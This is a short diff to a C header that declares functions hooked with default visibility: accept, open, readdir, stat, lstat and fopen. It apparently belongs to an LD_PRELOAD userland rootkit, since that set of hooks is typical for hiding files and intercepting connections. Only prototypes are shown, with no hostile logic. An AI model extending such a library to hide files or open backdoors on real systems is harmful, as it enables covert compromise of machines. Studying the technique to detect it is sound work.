@@ -20,7 +20,10 @@
 
 #pragma once
 
-#include <sys/socket.h>
+#include <dirent.h> /* struct dirent, DIR */
+#include <stdio.h> /* FILE */
+#include <sys/socket.h> /* struct sockaddr, socklen_t */
+#include <sys/stat.h> /* struct stat */
 
 # define _HOOKED __attribute__((visibility("default")))
 
@@ -29,6 +32,9 @@
  * This header file contains ALL protypes of hooked functions.
  */
 
-
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
-int open(const char *path, int oflag, ...) _HOOKED;
+int             accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) _HOOKED;
+int             open(const char *path, int oflag, ...) _HOOKED;
+struct dirent   *readdir(DIR *dirp) _HOOKED;
+int             stat(const char *pathname, struct stat *buf) _HOOKED;
+int             lstat(const char *path, struct stat *buf) _HOOKED;
+FILE            *fopen(const char *path, const char *mode) _HOOKED;
